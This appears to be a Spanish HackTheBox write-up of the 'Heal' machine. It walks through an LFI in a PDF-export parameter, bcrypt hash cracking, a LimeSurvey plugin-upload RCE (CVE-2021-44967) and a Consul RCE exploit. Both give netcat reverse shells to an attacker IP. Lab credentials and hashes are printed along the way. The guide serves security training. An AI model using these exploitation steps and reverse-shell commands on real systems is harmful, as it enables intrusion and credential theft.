---
icon: desktop
hidden: true
noIndex: true
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Heal



<figure><img src="../../.gitbook/assets/Heal (1).png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance

Realizaremos un reconocimiento con `Nmap` para ver los puertos que están expuestos en la máquina **`Heal`**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.

```bash
❯ nmap -p- --open -sS --min-rate 1000 -Pn -n 10.10.11.46 -oG allPorts
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-24 21:52 CET
Nmap scan report for 10.10.11.46
Host is up (0.24s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 17.42 seconds
```

A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.46
	[*] Open ports: 22,80

[*] Ports copied to clipboard
```

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato `oN` y `oX` para posteriormente trabajar con ellos. Verificamos que al parecer se trata de una máquina Ubuntu que dispone de una página de `Nginx` y el servicio SSH.

```bash
❯ nmap -sCV -p22,80 10.10.11.46 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-24 21:55 CET
Nmap scan report for 10.10.11.46
Host is up (0.065s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   96.32 ms 10.10.16.1
2   44.63 ms 10.10.11.46

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.11 seconds
```

Procederemos a transformar el archivo generado `targetedXML` para transformar el `XML` en un archivo `HTML` para posteriormente montar un servidor web y visualizarlo.

```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../.gitbook/assets/imagen (235).png" alt=""><figcaption></figcaption></figure>

Añadiremos en nuestro archivo `/etc/hosts` la entrada correspondiente que nos muestra **Nmap** que nos redirigrá el sitio web al acceder.

```bash
❯ cat /etc/hosts | grep 10.10.11.46
10.10.11.46 heal.htb
```

## Web Enumeration

Accederemos a [http://heal.htb](http://heal.htb) y verificaremos que existe un panel de inicio de sesión en el cual podemos crear un resumen profesesional en cuestión de minutos. Probaremos de registrarnos en el sitio web.

<figure><img src="../../.gitbook/assets/4057_vmware_JH3lPaRnS6.png" alt="" width="563"><figcaption></figcaption></figure>

Nos registraremos con nuestro usuario `gzzcoo`.

<figure><img src="../../.gitbook/assets/imagen (236).png" alt="" width="563"><figcaption></figcaption></figure>

Logramos acceder con nuestro usuario recién creado, entra las opciones que se nos muestran, ingresaremos a ellas para verificar que más opciones nos ofrece el sitio web. En este caso probaremos de acceder a `Survey`.

<figure><img src="../../.gitbook/assets/imagen (237).png" alt=""><figcaption></figcaption></figure>

Revisamos que nos lleva a [http://heal.htb/survey](http://heal.htb/survey), parece ser una página en la cual dándole a `Take the Survey` nos redirige a una página de un subdominio `take-survey.heal.htb` para realizar un cuestionario.

<figure><img src="../../.gitbook/assets/imagen (238).png" alt=""><figcaption></figcaption></figure>

Añadiremos este nuevo subdomino ennuestro archivo `/etc/hosts`.

```bash
❯ cat /etc/hosts | grep 10.10.11.46
10.10.11.46 heal.htb take-survey.heal.htb
```

Al acceder a la opción que nos daba el botón, nos encontramos con la siguiente página, la cual investigando no hay ningún tipo de información, simplemente un cuestionario a rellenar.

<figure><img src="../../.gitbook/assets/imagen (239).png" alt=""><figcaption></figcaption></figure>

Probaremos de acceder directamente a http://take-survey.heal.htb y verificamos que hemos logrado encontrar más información. Se nos indica que el usuario `Administrator` del sitio web es `ralph@heal.htb`.

<figure><img src="../../.gitbook/assets/imagen (240).png" alt=""><figcaption></figcaption></figure>

Realizaremos un escaneo de directorios y archivos sobre la página [http://take-survey.heal.htb/index.php/](http://take-survey.heal.htb/index.php/) y nos encontramos con el siguiente resultado.

```bash
❯ dirsearch -u "http://take-survey.heal.htb/index.php/" -t 30 -i 200

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 11460

Output File: /home/kali/Desktop/HackTheBox/Linux/Heal/Heal/content/reports/http_take-survey.heal.htb/_index.php__25-01-24_22-36-03.txt

Target: http://take-survey.heal.htb/

[22:36:03] Starting: index.php/
[22:36:28] 200 -   75KB - /index.php/admin/mysql/index.php
[22:36:40] 200 -   75KB - /index.php/bitrix/admin/index.php
```

Al probar de acceder al directorio `/admin`, nos encontramos con un panel de Administración que nos pide credenciales de acceso.

<figure><img src="../../.gitbook/assets/imagen (246).png" alt="" width="563"><figcaption></figcaption></figure>

Realizaremos un escaneo de subdominios de la página web, nos encontramos que todos los resultados nos devuelven **178 carácteres**.

```bash
❯ wfuzz -c --hc=404,400 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.heal.htb" http://heal.htb 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://heal.htb/
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                              
=====================================================================

000000001:   301        7 L      12 W       178 Ch      "statistics"                                                                                                                                                         
000000012:   301        7 L      12 W       178 Ch      "contact"                                                                                                                                                            
000000031:   301        7 L      12 W       178 Ch      "archives"   
```

Volveremos a realizar el escanao, descartando el resultado anterior. Después de un tiempo, logramos encontrar un subdominio llamado `api`.

```bash
❯ wfuzz -c --hh=178 --hc=404,400 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.heal.htb" http://heal.htb 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://heal.htb/
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                              
=====================================================================

000001013:   200        90 L     186 W      12515 Ch    "api"   
```

Añadiremos este nuevo subdominio en nuestro archivo `/etc/hosts`.

```bash
❯ cat /etc/hosts | grep 10.10.11.46
10.10.11.46 heal.htb take-survey.heal.htb api.heal.htb
```

Al acceder a http://api.heal.htb, se nos muestra la siguiente página web en la cual se nos indica que la página web utiliza `Rails 7.1.4`. Veremos si más adelante esta información es útil o no.

<figure><img src="../../.gitbook/assets/imagen (241).png" alt="" width="563"><figcaption></figcaption></figure>

## Initial Foothold

### Local File Inclusion (LFI) on Website parameter

Volveremos a la página de http://heal.htb/resume, en la cual nos permitía rellenar nuestro perfil profesional. Verificamos que nos proporcionan un botón de `Export as PDF`. Interceptaremos la solicitud con `BurpSuite` para verificar como es esta solicitud que se envía al servidor.

<figure><img src="../../.gitbook/assets/imagen (242).png" alt=""><figcaption></figcaption></figure>

Una vez tengamos la solicitud interceptada, realizaremos varias veces el redireccionamiento de la solicitud `Forward`, nos encontramos con la siguiente soliticud, la cual hace una petición por método `GET` sobre un directorio llamado `/downloads` y a través de una variable `filename` llama al archivo PDF que hemos generado.

Enviaremos esta solicitud al modo de `Repeater`.

<figure><img src="../../.gitbook/assets/4068_vmware_KgrNjCDLxN.png" alt=""><figcaption></figcaption></figure>

Modificaremos la solicitud que se envía al servidor, trataremos de listar el contenido del archivo `/etc/passwd` a través de un **Local File Inclusion (LFI)**.

Verificamos que el sitio web es vulnerable a **LFI** y hemos podido listar el contenido del `/etc/passwd` correctamente.

<figure><img src="../../.gitbook/assets/imagen (245).png" alt=""><figcaption></figcaption></figure>

Revisando el contenido del `/etc/passwd`, comprobamos que existen solamente dos usuarios sin privilegios que dispoonen de una `bash`.

<figure><img src="../../.gitbook/assets/imagen (247).png" alt=""><figcaption></figcaption></figure>

Si bien recordamos, nos encontramos en la página de [http://api.heal.htb](http://api.heal.htb) que la página web utilizaba `Rails 7.1.4`.

Por lo tanto, podemos pensar si podemos listar algún archivo de configuración de `Rails` para intentar encontrar información, configuraciones, credenciales, etc.

Nos encontramos con el siguiente blog en el cual nos explican donde se almacenan estos archivos.

{% embed url="https://guides.rubyonrails.org/configuring.html" %}

<figure><img src="../../.gitbook/assets/imagen (248).png" alt="" width="563"><figcaption></figcaption></figure>

Probaremos de listar el contenido del archivo `/config/database.yml` y en el resultado por parte del servidor, logramos visualizar el contenido del archivo. En este archivo se nos indica donde se almacena la base de datos de `Rails`.

<figure><img src="../../.gitbook/assets/imagen (249).png" alt=""><figcaption></figcaption></figure>

Trataremos de visualizar el contenido del archivo de la base de datos que utiliza la aplicación. En este caso, logramos visualizar el contenido en el cual se nos muestra al usuario `ralph` y su contraseña hasheada.

Recordemos que el usuario `ralph@heal.htb` es el usuario Administrator del sitio web.

<figure><img src="../../.gitbook/assets/4074_vmware_9CIzM0HpdY.png" alt=""><figcaption></figcaption></figure>

### Cracking Hashes

Verificarems el tipo de hash del cual se trata y a través de `hashcat` probaremos de crackear el hash. Comprobamos que logramos visualizar la contraseña en texto plano.

```bash
❯ hashid '$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG'
Analyzing '$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 

❯ hashcat -a 0 -m 3200 hashes /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

...[snip]...

$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369
```

### Accessing on LimeSurvey Administration Panel

Volveremos al panel de Administración de LimeSurvey a través de [http://take-survey.heal.htb/index.php/admin/authentication/sa/login](http://take-survey.heal.htb/index.php/admin/authentication/sa/login) y probaremos de acceder con el usuario `ralph`y sus credenciales encontradas.

<figure><img src="../../.gitbook/assets/4075_vmware_weSrLPAA1x.png" alt="" width="563"><figcaption></figcaption></figure>

Verificamos que hemos logrado obtener el acceso correctamente a `LimeSurvey`.

{% hint style="info" %}
LimeSurvey (anteriormente PHPSurveyor) es una aplicación de software libre para la realización de encuestas en línea1​, escrita en PHP y que utiliza bases de datos MySQL, PostgreSQL o MSSQL. Esta utilidad brinda la posibilidad a usuarios sin conocimientos de programación el desarrollo, publicación y recolección de respuestas de sus encuestas.
{% endhint %}

<figure><img src="../../.gitbook/assets/imagen (250).png" alt=""><figcaption></figcaption></figure>

### LimeSurvey Exploitation Remote Code Execution \[RCE] - (CVE-2021-44967)

Realizando una enumeración de la página web, nos encontramos que se trata de `LimeSurvey Community Edition Version 6.6.4`, lo cual podremos intentar buscar alguna vulnerabilidad conocida.

<figure><img src="../../.gitbook/assets/imagen (251).png" alt=""><figcaption></figcaption></figure>

Realizando una búsqueda por Internet, nos encontramos con el siguiente `CVE-2021-44967`.

{% embed url="https://nvd.nist.gov/vuln/detail/CVE-2021-44967" %}

{% hint style="danger" %}
Existe una vulnerabilidad de ejecución remota de código (RCE) en LimeSurvey 5.2.4 a través de la función de carga e instalación de complementos, que podría permitir que un usuario malintencionado remoto cargue un archivo de código PHP arbitrario.
{% endhint %}

Por otro lado, nos encontramos con el siguiente repositorio para expotar esta vulnerabilidad.

{% embed url="https://github.com/Y1LD1R1M-1337/Limesurvey-RCE" %}

Nos descargaremos el repositorio de GitHube del exploit.

```bash
❯ git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE; cd Limesurvey-RCE
Clonando en 'Limesurvey-RCE'...
remote: Enumerating objects: 24, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 24 (delta 2), reused 0 (delta 0), pack-reused 18 (from 1)
Recibiendo objetos: 100% (24/24), 10.00 KiB | 10.00 MiB/s, listo.
Resolviendo deltas: 100% (5/5), listo.
```

Editaremos el archivo `config.xml` para especificar la versión `6.0`, sino, no podremos explotar esta vulnerabilidad.

```bash
❯ cat config.xml
<?xml version="1.0" encoding="UTF-8"?>
<config>
    <metadata>
        <name>Y1LD1R1M</name>
        <type>plugin</type>
        <creationDate>2020-03-20</creationDate>
        <lastUpdate>2020-03-31</lastUpdate>
        <author>Y1LD1R1M</author>
        <authorUrl>https://github.com/Y1LD1R1M-1337</authorUrl>
        <supportUrl>https://github.com/Y1LD1R1M-1337</supportUrl>
        <version>5.0</version>
        <license>GNU General Public License version 2 or later</license>
        <description>
		<![CDATA[Author : Y1LD1R1M]]></description>
    </metadata>

    <compatibility>
        <version>3.0</version>
        <version>4.0</version>
        <version>5.0</version>
        <version>6.0</version>
    </compatibility>
    <updaters disabled="disabled"></updaters>
</config>
```

Editaremos el archivo `php-rev.php` y estableceremos nuestra dirección IP de atacante y el puerto desde donde estaremos en escucha.

<figure><img src="../../.gitbook/assets/4079_vmware_aqNmBBlOZx.png" alt=""><figcaption></figcaption></figure>

Comrpimiremos estos nuevos archivos en un archivo llamado por ejemplo, `Gzzcoo.zip`.

```bash
❯ zip Gzzcoo.zip config.xml php-rev.php
  adding: config.xml (deflated 57%)
  adding: php-rev.php (deflated 61%)
❯ ls -l Gzzcoo.zip
.rw-rw-r-- kali kali 1.6 KB Fri Jan 24 22:57:27 2025  Gzzcoo.zip
```

Desde el panel de `LimeSurvey`, accederemos al apartado de `Configuration < Plugins`.

<figure><img src="../../.gitbook/assets/imagen (252).png" alt=""><figcaption></figcaption></figure>

Dentro de la sección de Plugins, ingresaremos a la opción de `Upload & install`.

<figure><img src="../../.gitbook/assets/imagen (253).png" alt=""><figcaption></figcaption></figure>

Subiremos nuestro archivo `Gzzcoo.zip` para importarlo en el sitio web.

<figure><img src="../../.gitbook/assets/imagen (254).png" alt="" width="368"><figcaption></figcaption></figure>

Instalaremos el nuevo plugin en `LimeSurvey`.

<figure><img src="../../.gitbook/assets/imagen (255).png" alt=""><figcaption></figcaption></figure>

Por otro lado, nos pondremos en escucha por el puerto especificado.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

En el panel de Plugins, deberemos de activar el plugin subido.

<figure><img src="../../.gitbook/assets/4084_vmware_lDjYkjkMJD.png" alt=""><figcaption></figcaption></figure>

Confirmaremos la activación del plugin recién subido.

<figure><img src="../../.gitbook/assets/imagen (256).png" alt=""><figcaption></figcaption></figure>

Accederemos a [http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php](http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php) y volviendo a la terminal donde estábamos en escucha, verificamos que logramos acceder al equipo correctamente.

Nos encontramos como usuario `www-data`, el cual normalmente no dispone de ningún privilegio.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.46] 49700
Linux heal 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 22:15:53 up  1:24,  0 users,  load average: 0.09, 0.06, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@heal:/$
```

## Initial Access

### Information Leakage

Revisando los diferentes directorios, nos encontramos en el archivo `index.php` que especifican que el archivo de configuración se encuentra en `application/config/config.php`.

```bash
www-data@heal:~/limesurvey/admin$ ls -l
total 8
-rwxr-x--- 1 www-data www-data   33 Sep 27 10:27 admin.php
-rwxr-x--- 1 www-data www-data 1103 Sep 27 10:27 index.php
www-data@heal:~/limesurvey/admin$ cat index.php 
<?php

/*
* LimeSurvey
* Copyright (C) 2007-2011 The LimeSurvey Project Team / Carsten Schmitz
* All rights reserved.
* License: GNU/GPL License v2 or later, see LICENSE.php
* LimeSurvey is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

$config_folder = dirname(__FILE__) . '/../application/config/';
$config_file = $config_folder . 'config.php';
if (!file_exists($config_file)) {
    $config_file = $config_folder . 'config-sample-mysql.php';
}
define('BASEPATH', dirname(__FILE__) . '/..'); // To prevent direct access not allowed
$config = require($config_file);

$urlStyle = $config['components']['urlManager']['urlFormat'];

// Simple redirect to still have the old /admin URL
if ($urlStyle == 'path') {
    header('Location: ../index.php/admin');
} else {
    // For IIS use get style
    header('Location: ../index.php?r=admin');
}
```

Listaremos el contenido del archivo, y verificamos que aparecen credenciales de acceso a una base de datos de PostgreSQL.

```bash
www-data@heal:~/limesurvey/application/config$ cat config.php
<?php if (!defined('BASEPATH')) exit('No direct script access allowed');

...[snip]...

return array(
	'components' => array(
		'db' => array(
			'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
			'emulatePrepare' => true,
			'username' => 'db_user',
			'password' => 'AdmiDi0_pA$$w0rd',
			'charset' => 'utf8',
			'tablePrefix' => 'lime_',
		),
```

Después de varios intentos intentando acceder al PostgreSQL, probamos de verificar si estas credenciales se reutilizaban para uno de los usuarios que disponían de una `bash`.

Verificamos que hemos podido acceder como usuario `ron` y obtener la flag **user.txt**.

```bash
www-data@heal:/$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
ron:x:1001:1001:,,,:/home/ron:/bin/bash
www-data@heal:/$ su ralph
Password: 
su: Authentication failure
www-data@heal:/$ su ron
Password: 
ron@heal:/$ cat /home/ron/user.txt 
5a4c50cd03979eab6aa0c197792d4ec3
```

## Privilege Escalation

### Checking Internal Ports

Revisarmeos los puertos internos que se encuentran abiertos en el equipo, vemos un listado de puertos inusuales.

```bash
ron@heal:~$ netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8503          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      off (0.00/0/0)
```

### SSH Port Forwarding

Probaremos de realizar **SSH Port Forwarding** sobre todos los puertos internos encontrados hacía nuestro equipo local de atacante, para verificar que hay detás de ellos.

```bash
❯ ssh  -L 5423:127.0.0.1:5432 -L 8300:127.0.0.1:8300 -L 8301:127.0.0.1:8301 -L 8302:127.0.0.1:8302 -L 8500:127.0.0.1:8500 -L 8503:127.0.0.1:8503 -L 8600:127.0.0.1:8600 -L 3000:127.0.0.1:300 -L 3001:127.0.0.1:3001 ron@10.10.11.46
ron@10.10.11.46's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

ron@heal:~$
```

Verificaremos que todos los puertos se encuentran abiertos en nuestro equipo lccal.

```bash
❯ nmap -p- localhost
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-24 23:36 CET
Nmap scan report for localhost (127.0.0.1)
Host is up (0.0000040s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE
3000/tcp  open  ppp
3001/tcp  open  nessus
5423/tcp  open  virtualuser
8080/tcp  open  http-proxy
8300/tcp  open  tmi
8301/tcp  open  amberon
8302/tcp  open  unknown
8500/tcp  open  fmtp
8503/tcp  open  lsp-self-ping
8600/tcp  open  asterix
42583/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.15 seconds
```

Probando de acceder a http://127.0.0.1:8500, logramos acceder a un sitio web de `Hashicorp Consul`.

{% hint style="info" %}
HashiCorp Consul es una solución de redes de servicios que permite a los equipos gestionar la conectividad de red segura entre servicios y entre entornos locales y multicloud y tiempos de ejecución. Consul ofrece detección de servicios, malla de servicios, gestión de tráfico y actualizaciones automáticas para dispositivos de infraestructura de red. Puede utilizar estas funciones de forma individual o en conjunto en una única implementación de Consul.
{% endhint %}

<figure><img src="../../.gitbook/assets/imagen (259).png" alt=""><figcaption></figcaption></figure>

### Hashicorp Consul v1.0 - Remote Code Execution (RCE)

Buscando vulnerabilidades sobre la aplicación, nos encontramos con el siguiente exploit para obtener un RCE.

{% embed url="https://www.exploit-db.com/exploits/51117" %}

Nos ponemos en escucha por un puerto para recibir la Reverse Shell.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Ejecutamos el exploit sobre nuestro localhost en el puerto 8500 (debido que hemos realizado anteriormente el Port Forwarding) y especificamos nuestra dirección IP y el puerto donde vamos a estar en escucha.

```bash
❯ python3 exploit.py 127.0.0.1 8500 10.10.16.5 443 0

[+] Request sent successfully, check your listener
```

Volviendo a la terminal, nos encontramos que hemos logrado obtener acceso y en este caso somos el usuario `root`. Verificamos la flag de **root.txt**.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.46] 35072
bash: cannot set terminal process group (12578): Inappropriate ioctl for device
bash: no job control in this shell
root@heal:/# cat /root/root.txt
cat /root/root.txt
5bcfe05b5dd*********************
```
